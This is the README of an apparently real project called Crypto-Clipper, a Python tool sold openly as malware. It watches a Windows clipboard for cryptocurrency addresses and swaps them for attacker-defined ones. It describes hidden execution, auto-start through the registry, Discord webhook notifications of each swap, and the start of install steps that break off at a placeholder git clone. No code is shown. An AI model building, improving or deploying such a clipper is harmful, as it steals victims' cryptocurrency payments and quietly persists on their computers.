# Crypto-Clipper

A Python-based clipboard monitoring tool that detects and replaces cryptocurrency addresses (BTC, LTC, ETH, MATIC, BNB, XRP, ADA, SOL) with attacker-controlled addresses. It runs silently in the background, adds itself to Windows startup, sends Discord notifications on address swaps, and ensures the original address is overwritten in the clipboard.

## Features
- Monitors clipboard for valid cryptocurrency addresses (BTC, LTC, ETH, MATIC, BNB, XRP, ADA, SOL).
- Replaces detected addresses with attacker-defined addresses.
- Sends real-time notifications to a Discord webhook.
- Runs hidden (no console) using `pythonw.exe` or as a compiled `.exe`.
- Auto-starts on Windows boot via Registry.
- Ensures clipboard only contains the attacker’s address (includes fix for ETH addresses).

## Requirements
- Python 3.6+ (for `.py` execution)
- Dependencies: `pyperclip`, `requests`
- Windows OS (for startup integration and clipboard access)
- Discord webhook URL for notifications
- Valid cryptocurrency addresses for replacement

## Installation
1. Clone or download this repository:
   ```bash
   git clone https://github.com/yourusername/crypto-clipper.git
   cd crypto-clipper
